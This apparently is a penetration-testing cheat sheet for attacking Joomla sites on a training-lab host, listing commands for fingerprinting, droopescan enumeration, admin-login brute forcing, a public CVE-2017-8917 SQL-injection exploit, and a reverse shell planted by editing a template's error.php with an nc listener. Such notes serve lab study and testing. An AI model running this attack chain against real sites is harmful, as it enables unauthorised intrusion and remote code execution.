- `Admin page - /administrator`
- `Configuration files configuration.php | diagnostics.php | joomla.inc.php | config.inc.php`

### <span style="color:#50FA7B">General Information</span>
```bash
# Checking if Joomla
curl -s http://dev.inlanefreight.local/ | grep Joomla

# Check for robots.txt
http://dev.inlanefreight.local/robots.txt

# Check for README.txt
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

# To find the Joomla version
http://$VICTIM_IP/language/en-GB/en-GB.xml
```

### <span style="color:#50FA7B">Enumeration</span>
```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local


# Brute Force Admin Login
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### <span style="color:#50FA7B">Joomla  version 3.7.0 (CVE-2017-8917 SQL injection)</span>

1. Clone the Exploit Repository
https://github.com/stefanlucas/Exploit-Joomla

2. Run the Exploit Script
```
python3 joomblah.py  http://$VICTIM_IP/
```

### <span style="color:#50FA7B">Reverse Shell</span>

- Log in to the **Joomla admin dashboard**.
- Go to **Extensions > Templates** and select the active template i.e (**Protostar Details and Files**).
- Edit the `error.php` file and paste the **Pentestmonkey PHP reverse shell** code.
- Set up a listener on your attacker machine `rlwrap -f . -r nc -nvlp 4444`
- Now, to execute our payload, open a web browser and navigate to `http://$VICTIM_IP/templates/protostar/error.php.`